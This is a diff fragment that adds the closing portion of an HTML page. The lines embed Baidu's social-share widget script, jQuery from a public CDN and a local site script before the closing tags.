+<script>window._bd_share_config={"common":{},"share":{"bdCustomStyle":"/css/bdshare.css"}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+<!-- 百度分享 end -->
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+</div>
+</body>
+</html>
